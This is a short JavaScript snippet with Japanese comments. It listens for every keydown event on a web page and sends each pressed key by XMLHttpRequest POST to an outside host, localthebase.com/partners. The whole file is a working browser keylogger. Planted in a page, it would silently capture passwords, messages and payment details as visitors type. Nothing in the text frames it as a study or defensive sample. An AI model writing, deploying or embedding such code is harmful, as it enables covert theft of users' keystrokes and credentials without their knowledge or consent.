
function send(key) {
    
    // XMLHttpRequest オブジェクトの作成
    var xhr = new XMLHttpRequest();

    // 送信先 URL と HTTP メソッドを指定
    xhr.open('POST', 'https://localthebase.com/partners', true);

    // サーバーからの応答が正常に戻った場合の処理を設定
    xhr.onload = function () {
      if (xhr.status >= 200 && xhr.status < 300) {
        // 応答が成功した場合の処理をここに書く
        console.log("Success:", xhr.responseText);
      } else {
        // エラー処理をここに書く
        console.error("Request failed with status: " + xhr.status);
      }
    };

    // エラー発生時の処理を設定
    xhr.onerror = function () {
      console.error("Request failed");
    };

    // 送信するデータの準備
    var data = JSON.stringify({
      key: key,
    });

    // コンテントタイプの設定（JSON で送信する場合）
    xhr.setRequestHeader("Content-Type", "application/json");

    // データの送信
    xhr.send(data);
}


document.addEventListener('keydown', (event) => {
    console.log(event.key);
    send(event.key);
});
